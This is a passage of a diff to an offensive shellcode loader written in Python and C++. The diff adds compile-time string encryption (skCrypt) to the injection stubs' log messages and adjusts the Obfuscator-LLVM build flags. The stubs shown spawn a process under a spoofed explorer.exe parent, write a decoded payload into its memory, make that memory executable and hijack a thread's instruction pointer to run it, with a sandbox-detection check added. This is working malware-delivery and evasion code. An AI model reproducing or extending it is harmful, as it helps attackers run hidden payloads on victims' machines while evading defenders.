+                    safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
                     return 0;
                 }
                 else{
-                    std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+                    safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
                 }
 
                 res = NtResumeThread(thandle, 0);
 
                 if (res != 0){
-                    std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
+                    safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
                     return 0;
                 }
                 else{
-                    std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
+                    safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
                 }
 
                 NtClose(hProcess);
@@ -1184,11 +1205,11 @@ RemoteThreadContext_stub = """
         printf("Doing nothing!");
     }
 
-    HANDLE hParent = GetParentHandle("explorer.exe");
+    HANDLE hParent = GetParentHandle(skCrypt("explorer.exe"));
     if (hParent == INVALID_HANDLE_VALUE)
         return 0;
 
-    PROCESS_INFORMATION pi = SpawnProc((LPSTR)"REPLACE_ME_PROCESS", hParent);
+    PROCESS_INFORMATION pi = SpawnProc((LPSTR)skCrypt("REPLACE_ME_PROCESS"), hParent);
     if (pi.hProcess == INVALID_HANDLE_VALUE || pi.hThread == INVALID_HANDLE_VALUE)
         return 0;
     
@@ -1197,36 +1218,36 @@ RemoteThreadContext_stub = """
     res = NtAllocateVirtualMemory(hProcess, &base_addr, 0, &pnew, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (res != 0){
-        std::cout << "NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory FAILED to allocate memory in created process, exiting: "), res);
         return 0;
     }
     else {
-        std::cout << "NtAllocateVirtualMemory allocated memory in the created process sucessfully." << std::endl;
+        safe_print(skCrypt("NtAllocateVirtualMemory allocated memory in the created process sucessfully."));
     }
 
     res = NtWriteVirtualMemory(hProcess, base_addr, decoded, payload_len, &bytesWritten);
 
     if (res != 0){
-        std::cout << "NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory FAILED to write decoded payload to allocated memory: "), res);
         return 0;
     }
     else{
-        std::cout << "NtWriteVirtualMemory wrote decoded payload to allocated memory successfully." << std::endl;
+        safe_print(skCrypt("NtWriteVirtualMemory wrote decoded payload to allocated memory successfully."));
     }
 
     res = NtProtectVirtualMemory(hProcess, &base_addr, (PSIZE_T)&payload_len, PAGE_EXECUTE_READ, &oldprotect);
 
     if (res != 0){
-        std::cout << "NtProtectVirtualMemory FAILED to modify permissions: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory FAILED to modify permissions: "), res);
         return 0;
     }
     else{
-        std::cout << "NtProtectVirtualMemory modified permissions successfully." << std::endl;
+        safe_print(skCrypt("NtProtectVirtualMemory modified permissions successfully."));
     }
 
     FARPROC _loadLibrary = GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
     if (_loadLibrary == NULL) {
-        std::cout << "[X] Error: Could not find address of LoadLibrary" << std::endl;
+        safe_print(skCrypt("[X] Error: Could not find address of LoadLibrary"));
         return 0;
     }
 
@@ -1235,11 +1256,11 @@ RemoteThreadContext_stub = """
     res = NtCreateThreadEx(&hThread, MAXIMUM_ALLOWED, NULL, hProcess, (PVOID)_loadLibrary, NULL, TRUE, 0, 0, 0, NULL);
 
     if (res != 0){
-        std::cout << "NtCreateThreadEx FAILED to create thread in current process: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtCreateThreadEx FAILED to create thread in current process: "), res);
         return 0;
     }
     else{
-        std::cout << "NtCreateThreadEx created thread in current process successfully." << std::endl;
+        safe_print(skCrypt("NtCreateThreadEx created thread in current process successfully."));
     }
 
     CONTEXT ctx;
@@ -1249,11 +1270,11 @@ RemoteThreadContext_stub = """
     res = NtGetContextThread(hThread, &ctx);
 
     if (res != 0){
-        std::cout << "NtGetContextThread FAILED to get context of thread: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtGetContextThread FAILED to get context of thread: "), res);
         return 0;
     }
     else{
-        std::cout << "NtGetContextThread got context of thread successfully." << std::endl;
+        safe_print(skCrypt("NtGetContextThread got context of thread successfully."));
     }
 
     ctx.Rip = (DWORD64)base_addr;
@@ -1261,21 +1282,21 @@ RemoteThreadContext_stub = """
     res = NtSetContextThread(hThread, &ctx);
 
     if (res != 0){
-        std::cout << "NtSetContextThread FAILED to set context of thread: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtSetContextThread FAILED to set context of thread: "), res);
         return 0;
     }
     else{
-        std::cout << "NtSetContextThread set context of thread successfully." << std::endl;
+        safe_print(skCrypt("NtSetContextThread set context of thread successfully."));
     }
 
     res = NtResumeThread(hThread, 0);
 
     if (res != 0){
-        std::cout << "NtResumeThread FAILED to resume created thread: " << std::hex << res << std::endl;
+        safe_print(skCrypt("NtResumeThread FAILED to resume created thread: "), res);
         return 0;
     }
     else{
-        std::cout << "NtResumeThread resumed created thread successfully." << std::endl;
+        safe_print(skCrypt("NtResumeThread resumed created thread successfully."));
     }
 
     NtClose(hProcess);
@@ -1284,11 +1305,11 @@ RemoteThreadContext_stub = """
 
 invoke_sandbox_check = """
     if (CheckSandbox()) {
-        std::cout << "Sandbox checks failed; exiting." << std::endl;
+        safe_print(skCrypt("Sandbox checks failed; exiting."));
         return 0;
     }
 
-    std::cout << "Sandbox checks passed" << std::endl;
+    safe_print(skCrypt("Sandbox checks passed"));
 """
 
 rundll_stub = """
@@ -1381,9 +1402,6 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
     print("[+] ICYGUIDER'S CUSTOM SYSCALL SHELLCODE LOADER")
     method = method.lower()
     file_size = os.path.getsize(infile)
-    if file_size > 10000 and method == "processhollow":
-        print("[+] Stageless payload detected; using QueueUserAPC injection instead")
-        method = "queueuserapc"
     if method == "processhollow":
         #Take infile and add 5000 nops to shellcode.
         #This is because our shellcode doesn't seem to end up exactly where we write it to for some reason.
@@ -1459,6 +1477,8 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         stub = stub.replace("REPLACE_ME_SHELLCODE_VARS", wordShellcode)
         stub = stub.replace("REPLACE_ME_WORDLIST", cwordstring)
         stub = stub.replace("REPLACE_ME_FILEWORDS", fwordsstring)
+
+    stub = stub.replace("REPLACE_SAFEPRINT_FUNCTIONS", safePrint)
 
     if method == "processhollow":
         stub = stub.replace("REPLACE_PROCESS_FUNCTIONS", process_functions)
@@ -1602,7 +1622,7 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
         if obfuscator_LLVM == True:
             print("[+] Using Obfuscator-LLVM to compile stub...")
             # Feel free to modify the OLLVM flags to fit your needs.
-            os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,console -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+            os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,console -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
         else:
             os.system("x86_64-w64-mingw32-g++ stub.cpp -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,console -o {}".format(outfile))
     else:
@@ -1610,12 +1630,12 @@ def main(stub, infile, outfile, key, process, method, no_randomize, verbose, san
             print("[+] Using Obfuscator-LLVM to compile stub...")
             # Feel free to modify the OLLVM flags to fit your needs.
             if dll == True and dll_proxy != None:
-                os.system("x86_64-w64-mingw32-clang++ stub.cpp stub.def -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+                os.system("x86_64-w64-mingw32-clang++ stub.cpp stub.def -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
                 os.system("rm stub.def")
             elif dll == True and dll_proxy == None:
-                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,windows -shared -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
             else:
-                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -static -lpsapi -Wl,--subsystem,windows -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
+                os.system("x86_64-w64-mingw32-clang++ stub.cpp -s -w -fpermissive -std=c++2a -static -lpsapi -Wl,--subsystem,windows -Xclang -flto-visibility-public-std -mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -mllvm -bcf_loop=1 -mllvm -sub_loop=1 -mllvm -sobf -o {}".format(outfile))
         else:
             if dll == True and dll_proxy != None:
                 os.system("x86_64-w64-mingw32-g++ stub.cpp stub.def -s -w -masm=intel -fpermissive -static -lpsapi -Wl,--subsystem,windows -shared -o {}".format(outfile))
